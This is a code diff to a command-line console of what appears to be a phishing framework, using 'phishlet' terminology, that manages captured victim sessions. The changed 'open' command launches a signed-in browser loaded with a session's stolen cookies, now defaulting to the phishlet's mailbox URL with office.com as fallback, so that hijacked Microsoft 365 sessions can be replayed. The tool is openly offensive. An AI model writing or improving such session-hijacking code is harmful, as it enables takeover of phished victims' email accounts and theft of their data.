@@ -286,10 +286,16 @@ class Console(cmd.Cmd):
         print(code, out)
 
     # ---------- session reuse ----------
-    def _cookies_from_session(self, sid):
+    def _session_detail(self, sid):
         s = self.api.get_session(sid)
         if "error" in s:
             print(s)
+            return None
+        return s
+
+    def _cookies_from_session(self, sid):
+        s = self._session_detail(sid)
+        if s is None:
             return None
         return egcookies.cookies_from_session(s)
 
@@ -309,13 +315,18 @@ class Console(cmd.Cmd):
 
     def do_open(self, arg):
         """open <id> [--url U] [--fresh] [--disable-http2] [--chrome P] [--port N] [--headless]
-        — open a SIGNED-IN browser with the session's cookies"""
+        — open a SIGNED-IN browser with the session's cookies.
+        Default URL = the phishlet's reopen_url (mailbox); --url overrides."""
         parts = shlex.split(arg)
         if not parts or not parts[0].isdigit():
             print("usage: open <id> [--url U] [--fresh] [--disable-http2] [--chrome P] [--port N] [--headless]")
             return
         sid = int(parts[0])
-        opts = {"url": "https://www.office.com", "fresh": False, "disable_http2": False,
+        detail = self._session_detail(sid)
+        if detail is None:
+            return
+        default_url = detail.get("reopen_url") or "https://www.office.com"
+        opts = {"url": default_url, "fresh": False, "disable_http2": False,
                 "chrome": "", "port": 9222 + (sid % 500), "headless": False,
                 "profile": os.path.join(os.environ.get("TEMP", "/tmp"), f"eg-open-{sid}")}
         i = 1
@@ -334,7 +345,7 @@ class Console(cmd.Cmd):
                 opts["headless"] = True; i += 1
             else:
                 i += 1
-        dicts = self._cookies_from_session(sid)
+        dicts = egcookies.cookies_from_session(detail)
         if not dicts:
             print("[!] session has no cookies")
             return
